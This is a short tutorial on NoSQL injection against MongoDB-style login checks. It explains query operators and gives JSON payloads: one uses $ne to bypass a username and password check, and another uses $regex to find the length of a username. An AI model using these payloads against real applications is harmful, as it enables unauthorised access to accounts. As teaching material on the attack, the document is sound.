# NoSQL Injection

NoSQL servers like MongoDB offer a different approach to data storage from relational databases using SQL. Data is stored as collections of unstructured documents in JSON format. When sending a query for NoSQL, you pass a JSON array. To check the username and password of a user, you might pass the following array:

```javascript
{
"username":"johndoe",
"password":"letmein"
}
```

NoSQL also allows query operators such as

```text
$ne – not equal
$gt – greater than
$regex – regular expression
$where – a script to filter results
```

In the case of a NoSQL query object being passed to an application that is checking a username and password, the following query object would avoid the password check

```javascript
{
"username":{"$ne":""},
"password":{"$ne": ""}
}
```

The value {"$ne":""} would equate to true and so cause the entire expression to evaluate to true.

The $regex expression can be used to find out how long a username or password is by using the expression

```javascript
{
"username":{"$regex":"^.{5}$"},
"password":{"$ne": ""}
}
```

If the expression evaluates to true, you know that there is at least one username of length 5.

